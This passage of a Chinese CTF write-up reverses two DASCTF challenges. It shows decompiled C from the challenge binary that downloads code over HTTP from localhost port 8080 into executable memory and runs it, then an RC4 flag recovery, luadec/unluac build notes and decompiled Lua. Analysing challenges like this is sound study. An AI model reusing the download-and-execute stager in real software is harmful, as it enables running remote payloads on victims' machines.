**)(<span class="keyword">char</span> *))v1);</span><br><span class="line">  <span class="built_in">strcpy</span>(v15, <span class="string">"Hello GuiShou"</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(v19, <span class="string">"Tip"</span>);</span><br><span class="line">  v11 = v5(<span class="number">0</span>, &amp;unk_400000, <span class="number">4096</span>, <span class="number">64</span>);</span><br><span class="line">  v10 = (<span class="keyword">int</span> (*)(<span class="keyword">void</span>))v5(<span class="number">0</span>, &amp;unk_400000, <span class="number">4096</span>, <span class="number">64</span>);</span><br><span class="line">  v9 = <span class="number">0x4000000</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v22, <span class="string">"127.0.0.1"</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(v16, <span class="string">"8080"</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(v25, <span class="string">"GET"</span>);</span><br><span class="line">  v21[<span class="number">0</span>] = <span class="number">47</span>;</span><br><span class="line">  v21[<span class="number">1</span>] = <span class="number">115</span>;</span><br><span class="line">  v21[<span class="number">2</span>] = <span class="number">104</span>;</span><br><span class="line">  v21[<span class="number">3</span>] = <span class="number">101</span>;</span><br><span class="line">  v21[<span class="number">4</span>] = <span class="number">108</span>;</span><br><span class="line">  v21[<span class="number">5</span>] = <span class="number">108</span>;</span><br><span class="line">  v21[<span class="number">6</span>] = <span class="number">47</span>;</span><br><span class="line">  v21[<span class="number">7</span>] = <span class="number">118</span>;</span><br><span class="line">  v21[<span class="number">8</span>] = <span class="number">111</span>;</span><br><span class="line">  v21[<span class="number">9</span>] = <span class="number">105</span>;</span><br><span class="line">  v21[<span class="number">10</span>] = <span class="number">100</span>;</span><br><span class="line">  v21[<span class="number">11</span>] = <span class="number">13</span>;</span><br><span class="line">  v21[<span class="number">12</span>] = <span class="number">10</span>;</span><br><span class="line">  v21[<span class="number">13</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v20, <span class="string">"Mozilla/5.0 (Windows NT 6.1; rv:11.0)"</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(v23, <span class="string">"HTTP/1.0"</span>);</span><br><span class="line">  v14 = <span class="number">1</span>;</span><br><span class="line">  v18 = <span class="number">-1</span>;</span><br><span class="line">  v24 = <span class="number">0</span>;</span><br><span class="line">  v12 = v2(v20, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  v13 = v7(v12, v22, <span class="number">8080</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  v17 = v8(v13, v25, v21, v23, <span class="number">0</span>, <span class="number">0</span>, v9, <span class="number">0</span>);</span><br><span class="line">  v6(v17, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( v14 &amp;&amp; v18 )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = v4(v17, v24 + v11, <span class="number">4096</span>, &amp;v18);</span><br><span class="line">    v24 += v18;</span><br><span class="line">  &#125;</span><br><span class="line">  v3(v17);</span><br><span class="line">  v3(v13);</span><br><span class="line">  v3(v12);</span><br><span class="line">  ((<span class="keyword">void</span> (__cdecl *)(<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span> (*)(<span class="keyword">void</span>)))sub_3A059F)(v11, v24, v10);</span><br><span class="line">  <span class="keyword">return</span> v10();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>浏览器访问一下本地8080端口看看：确实。</p><p><img src="/2021/08/01/DASCTF-July-X-CBCTF-4th/image-20210801173140351.png" alt="image-20210801173140351"></p><p>剩下继续跟踪调试就好，请求读了一串字符串，然后用它解密出一个关键加密函数，从其中也知道程序是如何获取我们在bat脚本中输入的FLAG了：通过获取在启动当前进程下的FLAG变量获取。</p><p><img src="/2021/08/01/DASCTF-July-X-CBCTF-4th/image-20210801173515697.png" alt="image-20210801173515697"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GetEnvironmentVariable是一个从调用该函数的进程的环境变量中返回指定的变量名值的函数，主要参数有lpName、lpBuffer等。</span><br><span class="line"> </span><br><span class="line">GetEnvironmentVariable函数从调用该函数的进程的环境变量中,返回指定的变量名的值,该值是一个以零结尾的字符串指针.</span><br><span class="line"><span class="function">DWORD <span class="title">GetEnvironmentVariable</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">LPCTSTR lpName, <span class="comment">// address of environment variable name</span></span></span></span><br><span class="line"><span class="function"><span class="params">LPTSTR lpBuffer, <span class="comment">// address of buffer for variable value</span></span></span></span><br><span class="line"><span class="function"><span class="params">DWORD nSize <span class="comment">// size of buffer, in characters</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line">参数:</span><br><span class="line">lpName:要获取值的变量名字符串指针.</span><br><span class="line">lpBuffer:接收变量值的字符串指针</span><br><span class="line">nSize:接收变量值的内存大小.</span><br><span class="line">返回值:</span><br><span class="line">如果函数成功执行,则返回值是写入字符缓冲区的字符数量,但不包含<span class="string">'\0'</span>字符.</span><br><span class="line">如果没有找到所指的变量,则返回零.</span><br><span class="line">如果字符缓冲区的大小小于变量值的长度,返回值为缓冲区的大小.</span><br></pre></td></tr></table></figure><p>最后就是rc4流密码加密，得到密钥序列异或回去即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = [<span class="number">0x64</span>, <span class="number">0x2E</span>, <span class="number">0x90</span>, <span class="number">0x34</span>, <span class="number">0x41</span>, <span class="number">0xD8</span>, <span class="number">0x24</span>, <span class="number">0xCB</span>, <span class="number">0x52</span>, <span class="number">0x2E</span>, <span class="number">0xFB</span>, <span class="number">0x39</span>, <span class="number">0x3E</span>, <span class="number">0x91</span>, <span class="number">0x07</span>, <span class="number">0x0E</span>, <span class="number">0x96</span>, <span class="number">0xF6</span>, <span class="number">0x3C</span>, <span class="number">0x09</span>, <span class="number">0x9C</span>, <span class="number">0x21</span>, <span class="number">0x92</span>, <span class="number">0x21</span>, <span class="number">0xB2</span>, <span class="number">0xCC</span>, <span class="number">0x9F</span>, <span class="number">0x51</span>, <span class="number">0x48</span>, <span class="number">0x63</span>, <span class="number">0x4C</span>, <span class="number">0x8F</span>, <span class="number">0x72</span>, <span class="number">0x5D</span>, <span class="number">0xBF</span>, <span class="number">0x6C</span>, <span class="number">0x51</span>, <span class="number">0x76</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = [<span class="number">0x02</span>, <span class="number">0x42</span>, <span class="number">0xF1</span>, <span class="number">0x53</span>, <span class="number">0x3A</span>, <span class="number">0xBB</span>, <span class="number">0x42</span>, <span class="number">0xAA</span>, <span class="number">0x66</span>, <span class="number">0x1E</span>, <span class="number">0x9A</span>, <span class="number">0x58</span>, <span class="number">0x0E</span>, <span class="number">0xA8</span>, <span class="number">0x35</span>, <span class="number">0x68</span>, <span class="number">0xA4</span>, <span class="number">0xCE</span>, <span class="number">0x09</span>, <span class="number">0x3C</span>, <span class="number">0xAC</span>, <span class="number">0x40</span>, <span class="number">0xA5</span>, <span class="number">0x13</span>, <span class="number">0x8A</span>, <span class="number">0xFC</span>, <span class="number">0xAD</span>, <span class="number">0x30</span>, <span class="number">0x7B</span>, <span class="number">0x53</span>, <span class="number">0x75</span>, <span class="number">0xBD</span>, <span class="number">0x41</span>, <span class="number">0x6A</span>, <span class="number">0x8B</span>, <span class="number">0x0A</span>, <span class="number">0x67</span>, <span class="number">0x0B</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag = [s[i]^t[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">38</span>)]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag</span><br><span class="line">[<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">99</span>, <span class="number">102</span>, <span class="number">97</span>, <span class="number">52</span>, <span class="number">48</span>, <span class="number">97</span>, <span class="number">97</span>, <span class="number">48</span>, <span class="number">57</span>, <span class="number">50</span>, <span class="number">102</span>, <span class="number">50</span>, <span class="number">56</span>, <span class="number">53</span>, <span class="number">53</span>, <span class="number">48</span>, <span class="number">97</span>, <span class="number">55</span>, <span class="number">50</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">50</span>, <span class="number">97</span>, <span class="number">51</span>, <span class="number">48</span>, <span class="number">57</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">55</span>, <span class="number">52</span>, <span class="number">102</span>, <span class="number">54</span>, <span class="number">125</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bytes(flag)</span><br><span class="line"><span class="string">b'flag&#123;cfa40aa092f28550a72802a3092374f6&#125;'</span></span><br></pre></td></tr></table></figure><h3 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h3><p>第一次做程序中调用lua语言代码的题，这个题本身不难，但在总结题目时，一些环境上面遇到很多问题，记录一下。</p><p>我发现这个题是调用了lua是从ida打开的提示信息看到的，这也是出题人编译题目是没有注意这一点，其次从题目中字符串区域上下文找多翻翻也是可以发现的，Luas表示lua版本是5.3</p><p><img src="/2021/08/01/DASCTF-July-X-CBCTF-4th/image-20210805200714779.png" alt="image-20210805200714779"></p><p>还找到了base64码表，从引用找到一个对码表逆序和base64加密函数，在base64加密函数下断后发现程序不是断下来，猜测是输入字符串长度不对，试了几次长度32，36都不是。</p><p><img src="/2021/08/01/DASCTF-July-X-CBCTF-4th/image-20210805201317430.png" alt="image-20210805201317430"></p><p>然后既然我上面已经找到了程序加载的lua字节码，直接从这个入手，idapython提取出数据，找工具反编译。</p><p>开始找到luadec这个工具，编译环境问题真是花了主要的时间，，这里我去折腾了。<a href="https://github.com/viruscamp/luadec" target="_blank" rel="noopener">工具地址</a></p><p>首先编译这个lua源码，缺少各种依赖吧，印象最深得的缺少readline.h这个库（因为后面我要编译32位的lua找这个库的32位找半天），我是在ubuntu下，直接安装就是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libreadline-dev</span><br></pre></td></tr></table></figure><p>然后到luadec目录下去编译luadec：<strong>make LUAVER=5.3</strong>，当时又是很多问题，但找到问题，搜索安装上缺少项就能轻松解决。</p><p>编译好了，开始反编译：<strong>./luadec ans.luac &gt; ans.lua</strong>，问题来了：</p><p><img src="/2021/08/01/DASCTF-July-X-CBCTF-4th/image-20210805203310921.png" alt="image-20210805203310921"></p><p>从提示信息看应该是位数问题，目标lua是32位的，而我的luadec是64位的。</p><p>linux环境是64位的，默认编译的就是64位的，那怎么编译32位的呢。这是编译C代码，用的gcc，记得gcc是有个-m32选项，强制编译32位的程序（前提是我们要安装好32位程序所要依赖的各种库文件）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install build-essential module-assistant</span><br><span class="line">sudo apt-get install gcc-multilib g++-multilib</span><br></pre></td></tr></table></figure><p>安装后，随便写了一个C文件，来编译测试了一下，gcc -m32 1.c -o 1，可行。</p><p>然后去找Makefile文件，增加编译选项。因为对Makefile不熟悉，这里开始又疑惑了，，为什么没有gcc命令，那程序是怎么编译的！</p><p>后面才发现，其实在是第一个Makefile中指定了到src文件下进行make，所以找到src文件下的Makefile，增加-m32</p><p><img src="/2021/08/01/DASCTF-July-X-CBCTF-4th/image-20210805204517841.png" alt="image-20210805204517841"></p><p>然后编译，出现问题：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当搜索用于 /usr/lib/x86_64-linux-gnu/libreadline.a 时跳过不兼容的 -lreadline</span><br><span class="line">/usr/bin/ld: 找不到 -lreadline</span><br></pre></td></tr></table></figure><p>可以看到，编译时跑去找64位的readline库了，而因为不兼容所以跳过，就提示找不到。</p><p>问题是知道了，但找这个32位的库真是要命，搜索根本没有。。最后是在一篇其它问题里发现有这样一个名字：<strong>lib32readline6-dev</strong>，</p><p><a href="https://blog.csdn.net/zhbpd/article/details/41805737" target="_blank" rel="noopener">https://blog.csdn.net/zhbpd/article/details/41805737</a></p><p>安装发现果然是这个，高兴了一小会：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install lib32readline6-dev</span><br></pre></td></tr></table></figure><p>再到luadec下去编译luadec，同样要修改Makefile，增加gcc的选项-m32（这里我第一次编译忘了修改，又出现位数不兼容，<strong>Undefined reference to ‘__divdi3’</strong>的问题，好在及时发现，真是粗心大意，，）</p><p>终于成功，再次反编译，问题：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cannot find blockend &gt; 170 , pc = 169, f-&gt;sizecode = 170</span><br><span class="line">cannot find blockend &gt; 43 , pc = 42, f-&gt;sizecode = 43</span><br><span class="line">cannot find blockend &gt; 25 , pc = 24, f-&gt;sizecode = 25</span><br><span class="line">cannot find blockend &gt; 17 , pc = 16, f-&gt;sizecode = 17</span><br><span class="line">cannot find blockend &gt; 32 , pc = 31, f-&gt;sizecode = 32</span><br><span class="line">cannot find blockend &gt; 9 , pc = 8, f-&gt;sizecode = 9</span><br><span class="line">cannot find blockend &gt; 9 , pc = 8, f-&gt;sizecode = 9</span><br><span class="line">cannot find blockend &gt; 9 , pc = 8, f-&gt;sizecode = 9</span><br><span class="line">cannot find blockend &gt; 33 , pc = 32, f-&gt;sizecode = 33</span><br><span class="line">cannot find blockend &gt; 7 , pc = 6, f-&gt;sizecode = 7</span><br><span class="line">cannot find blockend &gt; 7 , pc = 6, f-&gt;sizecode = 7</span><br><span class="line">cannot find blockend &gt; 7 , pc = 6, f-&gt;sizecode = 7</span><br><span class="line">-- Decompiled using luadec 2.2 rev: 895d923 <span class="keyword">for</span> Lua 5.3 from https://github.com/viruscamp/luadec</span><br><span class="line">-- Command line: ans2.luac </span><br><span class="line"></span><br><span class="line">段错误 (核心已转储)</span><br></pre></td></tr></table></figure><p>然后尝试其它选项，如打印出函数调用结构：<strong>./luadec -pn ans2.luac</strong></p><p><img src="/2021/08/01/DASCTF-July-X-CBCTF-4th/image-20210805210418021.png" alt="image-20210805210418021"></p><p>尝试只打印0序号函数，因为其它函数都是它的子结构：<strong>./luadec -f 0 ans2.luac &gt; ans2.lua</strong></p><p><img src="/2021/08/01/DASCTF-July-X-CBCTF-4th/image-20210805210816751.png" alt="image-20210805210816751"></p><p>还行，整体上大概都反编译出了，但是感觉比较难看，我又去找了<strong>unluac</strong>来看看效果，它就是一个jar，下载和使用起来很方便：</p><p><a href="https://sourceforge.net/projects/unluac/files/latest/download" target="_blank" rel="noopener">unluac下载链接</a></p><p>usage：如果解码中出现 <code>\ddd</code>的形式，说明源码中有中文，这时注意加上：<strong>–rawstring</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar unluac_2021_06_10.jar --rawstring ans.luac &gt; ans.lua</span><br></pre></td></tr></table></figure><p>然后得到的结果，确实要比luadec得到的好一些：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> L0_1, L1_1, L2_1, L3_1, L4_1, L5_1, L6_1, L7_1, L8_1, L9_1, L10_1, L11_1, L12_1, L13_1, L14_1, L15_1, L16_1, L17_1, L18_1, L19_1, L20_1, L21_1, L22_1, L23_1, L24_1, L25_1, L26_1, L27_1, L28_1, L29_1, L30_1, L31_1, L32_1, L33_1, L34_1, L35_1, L36_1, L37_1, L38_1, L39_1, L40_1, L41_1, L42_1, L43_1, L44_1, L45_1, L46_1, L47_1, L48_1, L49_1, L50_1, L51_1, L52_1, L53_1</span><br><span class="line">L0_1 = <span class="built_in">require</span></span><br><span class="line">L1_1 = <span class="string">"enclib"</span></span><br><span class="line">L0_1 = L0_1(L1_1)</span><br><span class="line">enclib = L0_1</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">L0_1</span><span class="params">(A0_2)</span></span></span><br><span class="line">  <span class="keyword">local</span> L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2</span><br><span class="line">  L1_2 = <span class="built_in">string</span></span><br><span class="line">  L1_2 = L1_2.<span class="built_in">len</span></span><br><span class="line">  L2_2 = A0_2</span><br><span class="line">  L1_2 = L1_2(L2_2)</span><br><span class="line">  L2_2 = &#123;&#125;</span><br><span class="line">  L3_2 = &#123;&#125;</span><br><span class="line">  L4_2 = <span class="number">0</span></span><br><span class="line">  L5_2 = <span class="number">255</span></span><br><span class="line">  L6_2 = <span class="number">1</span></span><br><span class="line">  <span class="keyword">for</span> L7_2 = L4_2, L5_2, L6_2 <span class="keyword">do</span></span><br><span class="line">    L2_2[L7_2] = L7_2</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  L4_2 = <span class="number">1</span></span><br><span class="line">  L5_2 = L1_2</span><br><span class="line">  L6_2 = <span class="number">1</span></span><br><span class="line">  <span class="keyword">for</span> L7_2 = L4_2, L5_2, L6_2 <span class="keyword">do</span></span><br><span class="line">    L8_2 = L7_2 - <span class="number">1</span></span><br><span class="line">    L9_2 = <span class="built_in">string</span></span><br><span class="line">    L9_2 = L9_2.<span class="built_in">byte</span></span><br><span class="line">    L10_2 = A0_2</span><br><span class="line">    L11_2 = L7_2</span><br><span class="line">    L12_2 = L7_2</span><br><span class="line">    L9_2 = L9_2(L10_2, L11_2, L12_2)</span><br><span class="line">    L3_2[L8_2] = L9_2</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  L4_2 = <span class="number">0</span></span><br><span class="line">  L5_2 = <span class="number">0</span></span><br><span class="line">  L6_2 = <span class="number">255</span></span><br><span class="line">  L7_2 = <span class="number">1</span></span><br><span class="line">  <span class="keyword">for</span> L8_2 = L5_2, L6_2, L7_2 <span class="keyword">do</span></span><br><span class="line">    L9_2 = L2_2[L8_2]</span><br><span class="line">    L9_2 = L4_2 + L9_2</span><br><span class="line">    L10_2 = L8_2 % L1_2</span><br><span class="line">    L10_2 = L3_2[L10_2]</span><br><span class="line">    L9_2 = L9_2 + L10_2</span><br><span class="line">    L4_2 = L9_2 % <span class="number">256</span></span><br><span class="line">    L9_2 = L2_2[L4_2]</span><br><span class="line">    L10_2 = L2_2[L8_2]</span><br><span class="line">    L2_2[L4_2] = L10_2</span><br><span class="line">    L2_2[L8_2] = L9_2</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> L2_2</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">KSA = L0_1</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">L0_1</span><span class="params">(A0_2, A1_2)</span></span></span><br><span class="line">  <span class="keyword">local</span> L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2</span><br><span class="line">  L2_2 = <span class="number">0</span></span><br><span class="line">  L3_2 = <span class="number">0</span></span><br><span class="line">  L4_2 = &#123;&#125;</span><br><span class="line">  L5_2 = <span class="number">1</span></span><br><span class="line">  L6_2 = A1_2</span><br><span class="line">  L7_2 = <span class="number">1</span></span><br><span class="line">  